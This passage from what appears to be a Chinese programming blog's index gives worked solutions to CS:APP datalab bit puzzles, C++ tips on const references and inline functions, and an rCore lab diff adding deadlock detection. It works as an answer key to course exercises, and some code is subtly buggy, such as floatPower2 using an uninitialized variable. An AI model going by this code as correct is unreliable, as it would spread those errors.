1001）即可。\n最后将运算符的个数刚好卡在 15 个，勉强过关。\n代码int isAsciiDigit(int x) &#123;    // 0011 0000 &lt;= x &lt;= 0011 1001    int high = !((x &gt;&gt; 4) ^ 0x3);         // 4 ~ 31 位是否为 0x3    int case1 = ((x &amp; 0xf) &gt;&gt; 3) ^ 0x1;   // bit3 = 0    int case2 = !((x &amp; 0xf) ^ 0x8);       // bit0~3 = 1000    int case3 = !((x &amp; 0xf) ^ 0x9);       // bit0~3 = 1001    return high &amp; (case1 | case2 | case3);&#125;\nconditional思路很容易想到根据 x 的值是否非 0 构造出全 0 或者全 1 的数据 flag，然后将 flag 和 flag 取反后的值分别与 y 和 z 进行按位与，这样必然得到两个数：一个为 y 或 z 本身，另一个为 0，再将结果按位或即可。\n构造的方法比较巧妙，需要注意到全 0 和全 1 分别代表整数 0 和 -1，它们分别是 0 和 1 的相反数，而 0 和 1 我们可以根据表达式是否非 0，使用非运算符构造出来，再将构造的结果取反加一即可。\n代码int conditional(int x, int y, int z) &#123;    int flag = ~(!x) + 1;     // flag = x ? 0 : -1;    int yp = ~flag &amp; y;       // flag = 0, yp = y; flag = -1, yp = 0;    int zp = flag &amp; z;        // flag = 0, zp = 0; flag = -1, zp = z;    return yp | zp;&#125;\nisLessOrEqual思路判断两个数的大小关系，很容易想到使用作差的方法，判断 x + ~y + 1 的结果是否小于等于 0，即全为 0 或者最高位为 1。\n不过这里还需要考虑溢出：由于同号相减必定不会导致溢出，因此我们只需要考虑异号的情况。而如果两个数异号，那它们之间的大小关系就显而易见了。\n代码int isLessOrEqual(int x, int y) &#123;    int sign1 = ((x &gt;&gt; 31) &amp; 1) &amp; ((y &gt;&gt; 31) ^ 1);  // sign1 = (x &lt; 0 &amp;&amp; y &gt; 0) ? 1 : 0;    int sign2 = ((x &gt;&gt; 31) ^ 1) &amp; ((y &gt;&gt; 31) &amp; 1);  // sign2 = (x &gt; 0 &amp;&amp; y &lt; 0) ? 1 : 0;    int z = x + ~y + 1;                             // z = x - y    int sub = !(x ^ y) | ((z &gt;&gt; 31) &amp; 1);           // z &lt;= 0        return (sub | sign1) &amp; !sign2;&#125;\nlogicalNeg思路这题从二进制位的角度不好思考，不妨从其表示的十进制数的角度出发：\n当 x = 0 时，-x = x ，即 x 和 -x 的最高位相同，都为 0；当 x != 0 时，x 和 -x 的最高位必定有一个为 1。\n可以利用这一特性将 x | nx 右移 31 位，由于整数进行的是符号右移，因此当最高位为 0 时，右移的结果全为 0，当最高位为 1 时，右移的结果全为 1。再将右移结果加 1，即可构造出 1 或者 0，且刚好与零和非零对应。\n代码int logicalNeg(int x) &#123;    int nx = ~x + 1;    return ((x | nx) &gt;&gt; 31) + 1;&#125;\nhowManyBits思路这题看到限制 90 个运算符就给吓着了，实际上也确实很困难，自己想了半天也没有思路，于是在网上参考了别人的解法，感觉相当精妙，在这里介绍一番：\n对于正整数 x 而言，可以使用二分搜索的方式来确定所需的位数。首先判断 x 是否需要 16 位来表示，即 x 右移 16 位是否为 0，如果是，则右移 16 位，否则不做处理，然后再判断是否需要 8 位来处理，以此类推。最后将上述过程中的右移次数累加起来再加一（正整数首位需要为 0），即为总共需要的位数。\n对于负整数 x 而言，它所需的位数与 x 取反得到的整数所需位数相同，证明没整明白。。。\n代码int howManyBits(int x) &#123;    int absx = (x &gt;&gt; 31) ^ x;    int b16, b8, b4, b2, b1, b0;    // 二分搜索    b16 = (!!(absx &gt;&gt; 16)) &lt;&lt; 4;    absx = absx &gt;&gt; b16;    b8 = (!!(absx &gt;&gt; 8)) &lt;&lt; 3;    absx = absx &gt;&gt; b8;    b4 = (!!(absx &gt;&gt; 4)) &lt;&lt; 2;    absx = absx &gt;&gt; b4;    b2 = (!!(absx &gt;&gt; 2)) &lt;&lt; 1;    absx = absx &gt;&gt; b2;    b1 = (!!(absx &gt;&gt; 1));    absx = absx &gt;&gt; b1;    b0 = absx;    return b16 + b8 + b4 + b2 + b1 + b0 + 1;&#125;\nfloatScale2思路这题主要是要对规格化数和非规格化数进行分类讨论：\n当 uf 为规格化数，即阶码不为 0 时，乘二相当于将阶码位加 1。\n当 uf 为非规格化数，即阶码为 0 时，此时 uf 的值完全由尾数来表示，且不含隐含 0，因此乘二相当于将尾数乘二，即左移 1 位。\n需要注意的是，当 uf 为非规格化数且尾数最高位为 1 时，尾数左移会导致最高位的 1 移动到阶码的最低位。但经过验证，此时的结果仍然符合预期，即非规格化数无缝衔接到了规格化数，不禁感叹 IEEE 754 标准浮点数的设计之精妙。\n代码unsigned floatScale2(unsigned uf) &#123;    unsigned t = (uf &gt;&gt; 23) &amp; 0xff;  // 阶码    unsigned m = uf &amp; 0x7fffff;      // 尾数    if (t == 0xff) return uf;        // 无穷大或者 NaN    // 非规格化数    if (t == 0x00) &#123;        m &lt;&lt;= 1;        uf &amp;= 0xff800000;        uf |= m;    &#125;    // 规格化数    else &#123;        t += 1;        uf &amp;= 0x807fffff;        uf |= (t &lt;&lt; 23);    &#125;    return uf;&#125;\nfloatFloat2Int思路首先确定整数所能表示的上下界的值：当阶码小于 127，即指数位小于 0 时，此时浮点数 uf 小于 1，对应的整数为 0；当阶码大于 150，即指数位大于 23 时，此时单精度浮点数的精度（尾数长度）不足以正确表示对应的整数，返回 0x80000000。\n对于在合理范围内的 uf，将其转换为对应的整数，首先需要尾数最高位的高一位加上规格化数隐含的 1，再根据阶码的大小将尾数进行右移，阶码越大，右移位数越少。最后根据符号位的值选择是否将结果取反加一。\n代码int floatFloat2Int(unsigned uf) &#123;    unsigned s = (uf &gt;&gt; 31) &amp; 0x1;   // 符号    unsigned t = (uf &gt;&gt; 23) &amp; 0xff;  // 阶码    unsigned m = uf &amp; 0x7fffff;      // 尾数    int val;    // 小于 1    if (t &lt; 127) &#123;        val = 0;    &#125;    // 大于 1 且不溢出    else if (t &lt;= 150) &#123;        val = m | 0x800000;        val &gt;&gt;= (23 - (t - 127));        if (s == 1) &#123;            val = ~val + 1;        &#125;    &#125;    // 溢出    else &#123;        val = 0x80000000;    &#125;    return val;&#125;\nfloatPower2思路同样是对规格化数和非规格化数的分类讨论：\n当 x &gt;= -150 &amp;&amp; x &lt; -127 时，结果为非规格化数，此时浮点数表示只有一个位为 1，其余全为 0。直接根据指数 x 的值确定该位的位置即可。\n当 x &gt;= -127 &amp;&amp; x &lt; 128 时，结果为规格化数，此时浮点数表示的尾数全为 0，只有阶码用来表示指数的值。根据指数 x 的值确定阶码的值，然后构造出浮点数即可。\n代码unsigned floatPower2(int x) &#123;    unsigned val;    // 太小    if (x &lt; -150) &#123;        val = 0;    &#125;    // 非规格化数    else if (x &lt; -127) &#123;        val = 1 &lt;&lt; (150 + x);    &#125;    // 规格化数    else if (x &lt; 128) &#123;        unsigned t = x + 127;        val |= (t &lt;&lt; 23);    &#125;    // 太大    else &#123;        val = 0x7f800000;    &#125;    return val;&#125;\n","categories":["计算机基础"],"tags":["经验","计算机基础","位运算"]},{"title":"C++代码优化 Chapter2","url":"/2022/04/12/C++%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96%20Chapter2/","content":"本文将继续介绍一些常见的 C++ 代码优化技巧，本文为该系列的第二章，未来不定期更新。\n非必要时使用常量引用在上一章我们介绍了在进行函数的参数传递时，尤其对于所占内存空间较大的参数的传递，为了避免拷贝所带来的不必要的性能开销，应当尽量使用引用传递。并且，当该函数不需要对传入的参数进行更改时，应当在参数类型前添加 const 关键字表示这是一个常量引用。\n可能有朋友认为这里的 const 关键字的添加并不是必要的，但这样会带来两个问题：首先便是程序的可读性的下降，如果不添加 const 关键字，用户可能会认为该函数的变量是可更改的。其次它还将导致字面值将无法作为该函数的参数进行传递。所谓字面值，就是指代码中用数字或字符直接表示出来的常量（例如 1, &quot;hello world&quot;），这部分数据嵌入在程序中，当程序运行时被复制到内存的常量区，该区域为只读区域。示例如下：\nint findChar(std::string&amp; s, char target) &#123;\tfor (int i = 0; i &lt; s.size(); ++i) &#123;\t\tif (s[i] == target)\t\t\treturn i;\t&#125;\treturn -1;&#125;int main() &#123;\tauto ind = findChar(&quot;constant reference&quot;, &#x27;a&#x27;); // 编译出错&#125;\n以上实例中 findChar() 函数功能为在字符串 s 中寻找字符 target 并返回第一个 target 字符的下标，若未找到，则返回 -1. \n当用实参初始化形参时，会忽略掉顶层的 const（即修饰整个变量类型的 const）。因此，当形参包含顶层 const 时，实参类型既可以是常量类型，也可以是非常量类型。但如果形参不含顶层 const，正如上例所示，它将无法接收常量类型或者字面值类型，这样将很大程度上限制该函数的适用范围，同时还可能会导致一些意想不到的错误。\n正确的做法应该是在类型前添加 const 关键字，int findChar(const std::string&amp; s, char target)\n使用内联函数替代复杂条件表达式我们在编写程序时可能会遇到需要使用复杂的条件表达式的情况，例如 std::string s = s1.size() &gt; s2.size() ? s1 : s2; ，这是一个常规的布尔表达式，作用是得到字符串 s1 和字符串 s2 中长度较小的一个。这样写固然没错，但可读性不佳，尤其当该表达式需要被反复使用时。\n因此可以考虑将该表达式的操作定义为一个函数，如下所示：\nstd::string longerStr(const std::string&amp; s1, const std::string&amp; s2) &#123;\treturn s1.size() &gt; s2.size() ? s1 : s2;&#125;\n但是函数调用过程由于涉及到参数拷贝以及上一个调用函数的上下文保存，本身就存在一定的开销。那有没有一种办法使得该表达式操作即被封装成函数，又不会带来不必要的性能开销呢？内联函数就能够达成这样的目的。\n内联函数会在编译期间会将函数体直接在所有函数调用位置处展开，这样运行效率就与条件表达式无异了。将函数声明为内联函数的方法是在函数返回值类型前添加 inline 关键字。\ninline std::string longerStr(const std::string&amp; s1, const std::string&amp; s2) &#123;\treturn s1.size() &gt; s2.size() ? s1 : s2;&#125;// 编译期间展开为 std::string s = s1.size() &gt; s2.size() ? s1 : s2;std::string s = longerStr(s1, s2);\n这其实与 C 语言中的宏定义操作类似：#define LS(s1, s2) s1.size() &gt; s2.size() ? s1 : s2，但宏定义是十分简单的文本替换，它不会执行类型检查，导致的错误可能会十分隐蔽，因此在现代 C++ 程序中应当尽量避免使用宏定义。\n值得注意的是，内联函数通常只适用于函数体较短，逻辑较为简单的函数，通常函数体不超过 10 行。同时，对于一个多文件的程序，内联函数的定义通常直接位于头文件中，而不应先在头文件中声明，再在 cpp 文件中定义。\n","categories":["C++"],"tags":["C++"]},{"title":"2024开源操作系统训练营 rCore Chapter8练习","url":"/2024/11/04/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter8%E7%BB%83%E4%B9%A0/","content":"编程作业思路本实验要求为死锁和信号量机制实现死锁检测功能，并提供系统调用 enable_deadlock_detect，用以开启和关闭死锁检测功能。在开启死锁检测功能的情况下，用户使用 mutex_lock 或 semaphore_down 尝试获取互斥资源时，如果发现系统处于不安全状态（可能发生死锁）时拒绝对应的资源获取请求。\n实验手册中介绍的死锁检测算法为银行家算法（Banker\\’s Algorithm），由 Dijkstra 提出，算法的流程可以参照手册，这里不再详细介绍，代码实现如下：\n/// Banker&#x27;s Algoritm for dead lock checkfn deadlock_check(available: Vec&lt;usize&gt;, allocation: Vec&lt;Vec&lt;usize&gt;&gt;, need: Vec&lt;Vec&lt;usize&gt;&gt;) -&gt; bool &#123;    // n: thread count  m: resources count    let (n, m) = (allocation.len(), allocation[0].len());    let mut work = available;    let mut finish = vec![false; n];    loop &#123;        let mut idx = usize::MAX;        for i in 0..n &#123;            let mut flag = true;            if finish[i] &#123;                continue;            &#125;            for j in 0..m &#123;                if need[i][j] &gt; work[j] &#123;                    flag = false;                    break;                &#125;            &#125;            if flag &#123;                idx = i;                break;            &#125;        &#125;        // has found a thread meet the requirement        if idx != usize::MAX &#123;            for j in 0..m &#123;                work[j] += allocation[idx][j];            &#125;            finish[idx] = true;        &#125; else &#123;            break;        &#125;    &#125;    finish.iter().all(|&amp;x| x)&#125;\n根据现有的 Available, Allocation 和 Need 来进行死锁的检测并不复杂，关键在于如何将这一算法融入现有的线程互斥机制中，更具体地说，如何维护内核中与此相关的状态，以便在进行死锁检测前能够正确构造出 Available, Allocation 和 Need 数据结构。\n不妨先考虑更简单的情况：要想为锁机制实现死锁检测，如何维护其状态？首先需要保存当前线程需要哪把锁，需要明确的一点是：每个线程“需要”的资源只有 1 个，因为每个线程只有当所需的资源被满足后才会继续执行以获取更多资源，否则就会被阻塞。因此可以为线程控制块添加一个 usize 变量 mutex_need 来存储该线程当前需要锁资源的 id。除此之外，还需要一个向量 mutex_allocation 来存储线程已获取未释放锁资源的 id。\n当使用 sys_mutex_lock(mutex_id) 尝试获取 mutex_id 的锁时，在使用 mutex.lock() 实际获取锁之前，将当前线程的 mutex_need 设置为 mutex_id，当线程成功获取锁资源后，将 mutex_id 放入 mutex_allocation 向量中，并将 mutex_need 设置为空（我这里采用的是将 usize::MAX 看作空，也可以使用 Option 类型，相对来说更优雅）。\n当使用 sys_mutex_unlock(mutex_id) 尝试释放 mutex_id 的锁时，在使用 mutex.unlock() 实际释放锁之前，查找当前线程的 mutex_allocation 向量，移除值为 mutex_id 的元素。\n实现上述逻辑后，就能在进行死锁检测前，根据所维护的信息将 Available, Allocation 和 Need 构造出来，作为银行家算法的参数，检测当前系统是否处于不安全状态，构造代码如下所示：\nif process_inner.dlcheck_option &#123;    // initialize data structure for Banker&#x27;s Algorithm:    // Avavilable Vector, Allocation Matrix, Need Matrix    let n = process_inner.tasks.len();    let m = process_inner.mutex_list.len();    let mut available: Vec&lt;usize&gt; = vec![1; m];    let mut allocation: Vec&lt;Vec&lt;usize&gt;&gt; = vec![vec![0; m]; n];    let mut need: Vec&lt;Vec&lt;usize&gt;&gt; = vec![vec![0; m]; n];    for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;        match task_opt &#123;            Some(task) =&gt; &#123;                let task_inner = task.inner_exclusive_access();                for mid in &amp;task_inner.mutex_allocation &#123;                    allocation[i][*mid] += 1;                    available[*mid] -= 1;                &#125;                let nid = task_inner.mutex_need;                if nid != usize::MAX &#123;                    need[i][nid] += 1;                &#125;                drop(task_inner);            &#125;            None =&gt; &#123;&#125;        &#125;    &#125;    if !deadlock_check(available, allocation, need) &#123;        return -0xDEAD;    &#125;&#125;\n信号量机制的实现大体相似，不过需要注意一些细节。\n因为信号量的数量不再是二值的（有或没有），因此线程的资源分配向量中还需要包含每个信号量的数量，向量的元素可以选择用 &lt;sem_id, cnt&gt; 这样的二元组来表示，也可以用 cnt 个 sem_id 元素来表示这么一个二元组，我在这里采用的是前者。\n另外，信号量还可以为负数，负数信号量的绝对值表示当前资源被提前“透支”的数量，而在银行家算法中，资源数量 Available[i][j] 不能为负数，此时应该将其看作 0。\navailable.push(max(sem_inner.count, 0) as usize);\n最后，当线程 A 提前“透支”信号量进入休眠状态，线程 B 释放资源后调用 wakeup_task(task) 尝试唤醒线程 A 前，设置线程 A 的 sem_allocation 向量。否则可能由于线程调度的不确定性，导致线程 B 在被 sem_allocation 未被设置的情况下被调度，从而后续的死锁检测出现错误，让系统意外地进入死锁的状态。\n\n有关这样做法的合理性原因，我也不是很确定，因为我在未遵守上述顺序的情况下，执行 ch8_deadlock_sem2 进入死锁的几率非常大（大约 90%），而这应该不全是线程调度的随机性所导致。\n\n代码diff --git a/os/src/sync/semaphore.rs b/os/src/sync/semaphore.rsindex 509b504..5743172 100644--- a/os/src/sync/semaphore.rs+++ b/os/src/sync/semaphore.rs@@ -36,6 +36,15 @@ impl Semaphore &#123;         inner.count += 1;         if inner.count &lt;= 0 &#123;             if let Some(task) = inner.wait_queue.pop_front() &#123;+                let mut task_inner = task.inner_exclusive_access();+                let sem_id = task_inner.sem_need;+                match task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;+                    Some(index) =&gt; task_inner.sem_allocation[index].1 += 1,+                    None =&gt; task_inner.sem_allocation.push((sem_id, 1)),+                &#125;+                task_inner.sem_need = usize::MAX;+                drop(task_inner);+                                 wakeup_task(task);             &#125;         &#125;@@ -50,6 +59,17 @@ impl Semaphore &#123;             inner.wait_queue.push_back(current_task().unwrap());             drop(inner);             block_current_and_run_next();+        &#125; else &#123;+            let task = current_task().unwrap();+            let mut task_inner = task.inner_exclusive_access();+            let sem_id = task_inner.sem_need;+            match task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;+                Some(index) =&gt; task_inner.sem_allocation[index].1 += 1,+                None =&gt; task_inner.sem_allocation.push((sem_id, 1)),+            &#125;+            task_inner.sem_need = usize::MAX;+            drop(task_inner);+            drop(task);         &#125;     &#125; &#125;diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex 31fa22a..82c0991 100644--- a/os/src/syscall/process.rs+++ b/os/src/syscall/process.rs@@ -1,11 +1,13 @@+use core::mem::size_of;+ use crate::&#123;     config::MAX_SYSCALL_NUM,     fs::&#123;open_file, OpenFlags&#125;,-    mm::&#123;translated_ref, translated_refmut, translated_str&#125;,+    mm::&#123;translated_byte_buffer, translated_ref, translated_refmut, translated_str&#125;,     task::&#123;         current_process, current_task, current_user_token, exit_current_and_run_next, pid2process,         suspend_current_and_run_next, SignalFlags, TaskStatus,-    &#125;,+    &#125;, timer::get_time_us, &#125;; use alloc::&#123;string::String, sync::Arc, vec::Vec&#125;; @@ -164,10 +166,24 @@ pub fn sys_kill(pid: usize, signal: u32) -&gt; isize &#123; /// HINT: What if [`TimeVal`] is splitted by two pages ? pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_get_time&quot;,         current_task().unwrap().process.upgrade().unwrap().getpid()     );-    -1+    let _us = get_time_us();+    let time_val = TimeVal &#123;+        sec: _us / 1_000_000,+        usec: _us % 1_000_000,+    &#125;;+    let buffers = translated_byte_buffer(+        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal&gt;());+    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;+    for buffer in buffers &#123;+        unsafe &#123;+            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());+            time_val_ptr = time_val_ptr.add(buffer.len());+        &#125;+    &#125;+    0 &#125;  /// task_info syscalldiff --git a/os/src/syscall/sync.rs b/os/src/syscall/sync.rsindex 290ee6f..6d25e65 100644--- a/os/src/syscall/sync.rs+++ b/os/src/syscall/sync.rs@@ -1,7 +1,11 @@+use core::cmp::max;+ use crate::sync::&#123;Condvar, Mutex, MutexBlocking, MutexSpin, Semaphore&#125;; use crate::task::&#123;block_current_and_run_next, current_process, current_task&#125;; use crate::timer::&#123;add_timer, get_time_ms&#125;; use alloc::sync::Arc;+use alloc::vec;+use alloc::vec::Vec; /// sleep syscall pub fn sys_sleep(ms: usize) -&gt; isize &#123;     trace!(@@ -71,9 +75,75 @@ pub fn sys_mutex_lock(mutex_id: usize) -&gt; isize &#123;     let process = current_process();     let process_inner = process.inner_exclusive_access();     let mutex = Arc::clone(process_inner.mutex_list[mutex_id].as_ref().unwrap());++    // set mutex_need to current+    let task = current_task().unwrap();+    let mut task_inner = task.inner_exclusive_access();+    task_inner.mutex_need = mutex_id;+    drop(task_inner);+    drop(task);+    +    if process_inner.dlcheck_option &#123;+        // initialize data structure for Banker&#x27;s Algorithm:+        // Avavilable Vector, Allocation Matrix, Need Matrix+        let n = process_inner.tasks.len();+        let m = process_inner.mutex_list.len();+        let mut available: Vec&lt;usize&gt; = vec![1; m];+        let mut need: Vec&lt;Vec&lt;usize&gt;&gt; = vec![vec![0; m]; n];+        let mut allocation: Vec&lt;Vec&lt;usize&gt;&gt; = vec![vec![0; m]; n];+        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;+            match task_opt &#123;+                Some(task) =&gt; &#123;+                    let task_inner = task.inner_exclusive_access();+                    for mid in &amp;task_inner.mutex_allocation &#123;+                        allocation[i][*mid] += 1;+                        available[*mid] -= 1;+                    &#125;+                    let nid = task_inner.mutex_need;+                    if nid != usize::MAX &#123;+                        need[i][nid] += 1;+                    &#125;+                    drop(task_inner);+                &#125;+                None =&gt; &#123;&#125;+            &#125;+        &#125;++        if !deadlock_check(available, allocation, need) &#123;+            return -0xDEAD;+        &#125;+    &#125;++         drop(process_inner);     drop(process);     mutex.lock();++    let task = current_task().unwrap();+    let mut task_inner = task.inner_exclusive_access();+    task_inner.mutex_allocation.push(mutex_id);+    task_inner.mutex_need = usize::MAX;+    drop(task_inner);+    drop(task);+     0 &#125; /// mutex unlock syscall@@ -89,11 +159,22 @@ pub fn sys_mutex_unlock(mutex_id: usize) -&gt; isize &#123;             .unwrap()             .tid     );+             let process = current_process();     let process_inner = process.inner_exclusive_access();     let mutex = Arc::clone(process_inner.mutex_list[mutex_id].as_ref().unwrap());     drop(process_inner);     drop(process);++    let task = current_task().unwrap();+    let mut task_inner = task.inner_exclusive_access();+    if let Some(index) = task_inner.mutex_allocation.iter().position(|&amp;x| x == mutex_id) &#123;+        task_inner.mutex_allocation.swap_remove(index);+    &#125;+    drop(task_inner);+    drop(task);+         mutex.unlock();     0 &#125;@@ -142,10 +223,21 @@ pub fn sys_semaphore_up(sem_id: usize) -&gt; isize &#123;             .unwrap()             .tid     );+         let process = current_process();     let process_inner = process.inner_exclusive_access();     let sem = Arc::clone(process_inner.semaphore_list[sem_id].as_ref().unwrap());     drop(process_inner);+    +    let task = current_task().unwrap();+    let mut task_inner = task.inner_exclusive_access();+    if let Some(index) = task_inner.sem_allocation.iter().position(|&amp;x| x.0 == sem_id) &#123;+        task_inner.sem_allocation[index].1 -= 1;+        if task_inner.sem_allocation[index].1 == 0 &#123;+        \ttask_inner.sem_allocation.swap_remove(index);+        &#125;+    &#125;+    drop(task_inner);+    drop(task);+         sem.up();     0 &#125;@@ -165,8 +257,89 @@ pub fn sys_semaphore_down(sem_id: usize) -&gt; isize &#123;     let process = current_process();     let process_inner = process.inner_exclusive_access();     let sem = Arc::clone(process_inner.semaphore_list[sem_id].as_ref().unwrap());++    let task = current_task().unwrap();+    let mut task_inner = task.inner_exclusive_access();+    task_inner.sem_need = sem_id;+    drop(task_inner);+    drop(task);++    if process_inner.dlcheck_option &#123;+        // initialize data structure for Banker&#x27;s Algorithm:+        // Avavilable Vector, Allocation Matrix, Need Matrix+        let n = process_inner.tasks.len();+        let m = process_inner.semaphore_list.len();+        let mut available:Vec&lt;usize&gt; = Vec::new();+        for sem_opt in &amp;process_inner.semaphore_list &#123;+            match sem_opt &#123;+                Some(sem) =&gt; &#123;+                    let sem_inner = sem.inner.exclusive_access();+                    available.push(max(sem_inner.count, 0) as usize);+                    drop(sem_inner);+                &#125;+                None =&gt; available.push(0),+            &#125;+        &#125;+        let mut allocation: Vec&lt;Vec&lt;usize&gt;&gt; = vec![vec![0; m]; n];+        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;+            match task_opt &#123;+                Some(task) =&gt; &#123;+                    let task_inner = task.inner_exclusive_access();+                    for (id, alloc) in &amp;task_inner.sem_allocation &#123;+                        allocation[i][*id] += *alloc;+                    &#125;+                    drop(task_inner);+                &#125;+                None =&gt; &#123;&#125;+            &#125;+        &#125;+        let mut need: Vec&lt;Vec&lt;usize&gt;&gt; = vec![vec![0; m]; n];+        for (i, task_opt) in process_inner.tasks.iter().enumerate() &#123;+            match task_opt &#123;+                Some(task) =&gt; &#123;+                    let task_inner = task.inner_exclusive_access();+                    let nid = task_inner.sem_need;+                    if nid != usize::MAX &#123;+                        need[i][nid] += 1;+                    &#125;+                    drop(task_inner);+                &#125;+                None =&gt; &#123;&#125;+            &#125;+        &#125;++        if !deadlock_check(available, allocation, need) &#123;+            return -0xDEAD;+        &#125;+    &#125;++         drop(process_inner);     sem.down();     0 &#125; /// condvar create syscall@@ -246,6 +419,81 @@ pub fn sys_condvar_wait(condvar_id: usize, mutex_id: usize) -&gt; isize &#123; /// /// YOUR JOB: Implement deadlock detection, but might not all in this syscall pub fn sys_enable_deadlock_detect(_enabled: usize) -&gt; isize &#123;-    trace!(&quot;kernel: sys_enable_deadlock_detect NOT IMPLEMENTED&quot;);-    -1+    trace!(&quot;kernel: sys_enable_deadlock_detect&quot;);+    let process = current_process();+    let mut process_inner = process.inner_exclusive_access();+    let mut flag = 0;+    match _enabled &#123;+        0 =&gt; process_inner.dlcheck_option = false,+        1 =&gt; process_inner.dlcheck_option = true,+        _ =&gt; flag = -1,+    &#125;+    drop(process_inner);+    flag &#125;+/// Banker&#x27;s Algoritm for dead lock check+fn deadlock_check(available: Vec&lt;usize&gt;, allocation: Vec&lt;Vec&lt;usize&gt;&gt;, need: Vec&lt;Vec&lt;usize&gt;&gt;) -&gt; bool &#123;+    // n: thread count  m: resources count+    let (n, m) = (allocation.len(), allocation[0].len());+    let mut work = available;+    let mut finish = vec![false; n];+    loop &#123;+        let mut idx = usize::MAX;+        for i in 0..n &#123;+            let mut flag = true;+            if finish[i] &#123;+                continue;+            &#125;+            for j in 0..m &#123;+                if need[i][j] &gt; work[j] &#123;+                    flag = false;+                    break;+                &#125;+            &#125;+            if flag &#123;+                idx = i;+                break;+            &#125;+        &#125;+        // has found a thread meet the requirement+        if idx != usize::MAX &#123;+            for j in 0..m &#123;+                work[j] += allocation[idx][j];+            &#125;+            finish[idx] = true;+        &#125; else &#123;+            break;+        &#125;+    &#125;+    finish.iter().all(|&amp;x| x)+&#125;+diff --git a/os/src/task/process.rs b/os/src/task/process.rsindex c2be1ce..471c63a 100644--- a/os/src/task/process.rs+++ b/os/src/task/process.rs@@ -49,6 +49,8 @@ pub struct ProcessControlBlockInner &#123;     pub semaphore_list: Vec&lt;Option&lt;Arc&lt;Semaphore&gt;&gt;&gt;,     /// condvar list     pub condvar_list: Vec&lt;Option&lt;Arc&lt;Condvar&gt;&gt;&gt;,+    /// deadlock check option+    pub dlcheck_option: bool, &#125;  impl ProcessControlBlockInner &#123;@@ -119,6 +121,7 @@ impl ProcessControlBlock &#123;                     mutex_list: Vec::new(),                     semaphore_list: Vec::new(),                     condvar_list: Vec::new(),+                    dlcheck_option: false,                 &#125;)             &#125;,         &#125;);@@ -245,6 +248,7 @@ impl ProcessControlBlock &#123;                     mutex_list: Vec::new(),                     semaphore_list: Vec::new(),                     condvar_list: Vec::new(),+                    dlcheck_option: false,                 &#125;)             &#125;,         &#125;);diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex 0136098..6818590 100644--- a/os/src/task/task.rs+++ b/os/src/task/task.rs@@ -5,7 +5,9 @@ use super::&#123;kstack_alloc, KernelStack, ProcessControlBlock, TaskContext&#125;; use crate::trap::TrapContext; use crate::&#123;mm::PhysPageNum, sync::UPSafeCell&#125;; use alloc::sync::&#123;Arc, Weak&#125;;+use alloc::vec::Vec; use core::cell::RefMut;+use core::usize;  /// Task control block structure pub struct TaskControlBlock &#123;@@ -41,6 +43,14 @@ pub struct TaskControlBlockInner &#123;     pub task_status: TaskStatus,     /// It is set when active exit or execution error occurs     pub exit_code: Option&lt;i32&gt;,+    /// The resources need of mutex+    pub mutex_need: usize, // mutex id need (usize::MAX represents donot need any mutex)+    /// The resources need of semaphore+    pub sem_need: usize,   // semaphore id need (usize::MAX represents donot need any semaphore)+    /// The resources allocated of mutex+    pub mutex_allocation: Vec&lt;usize&gt;,         // elem: mutex id allocated+    /// The resources allocated of semaphore+    pub sem_allocation: Vec&lt;(usize, usize)&gt;,  // elem: (sem id allocated, count allocated) &#125;  impl TaskControlBlockInner &#123;@@ -75,6 +85,10 @@ impl TaskControlBlock &#123;                     task_cx: TaskContext::goto_trap_return(kstack_top),                     task_status: TaskStatus::Ready,                     exit_code: None,+                    mutex_need: usize::MAX,+                    sem_need: usize::MAX,+                    mutex_allocation: Vec::new(),+                    sem_allocation: Vec::new(),                 &#125;)             &#125;,         &#125;\n问答作业t1在我们的多线程实现中，当主线程 (即 0 号线程) 退出时，视为整个进程退出， 此时需要结束该进程管理的所有线程并回收其资源。\nQ1: 需要回收的资源有哪些？\nA1: 线程控制块、线程栈、互斥锁、信号量、条件变量等。\nQ2: 其他线程的 TaskControlBlock 可能在哪些位置被引用，分别是否需要回收，为什么？\nA2: 线程同步原语中，例如 rCore 信号量的等待队列 wait_queue 中，它们需要被回收，否则可能导致死锁或其他并发问题。\nt2Q: 对比以下两种 Mutex.unlock 的实现，二者有什么区别？这些区别可能会导致什么问题？\nimpl Mutex for Mutex1 &#123;    fn unlock(&amp;self) &#123;        let mut mutex_inner = self.inner.exclusive_access();        assert!(mutex_inner.locked);        mutex_inner.locked = false;        if let Some(waking_task) = mutex_inner.wait_queue.pop_front() &#123;            add_task(waking_task);        &#125;    &#125;&#125;impl Mutex for Mutex2 &#123;    fn unlock(&amp;self) &#123;        let mut mutex_inner = self.inner.exclusive_access();        assert!(mutex_inner.locked);        if let Some(waking_task) = mutex_inner.wait_queue.pop_front() &#123;            add_task(waking_task);        &#125; else &#123;            mutex_inner.locked = false;        &#125;    &#125;&#125;\nA: \n对于 Mutex1，如果有多个线程在等待锁，并且 Mutex1 解锁后立即唤醒一个等待的线程，而此时另一个线程已经获取了锁，那么被唤醒的线程可能会发现锁已经被其他线程持有，从而再次进入等待状态。这会导致不必要的额外等待和上下文切换。例如，假设线程 A 持有锁并解锁，线程 B 和 C 都在等待队列中。线程 A 解锁后，mutex_inner.locked 被设置为 false，然后唤醒线程 B。但在线程 B 开始执行之前，线程 C 已经获取了锁。此时，线程 B 会发现锁已被线程 C 持有，不得不重新进入等待队列。\n对于 Mutex2，如果它解锁时有等待的任务，mutex_inner.locked 不会被设置为 false。这意味着当被唤醒的任务开始执行时，它会看到 locked 仍然是 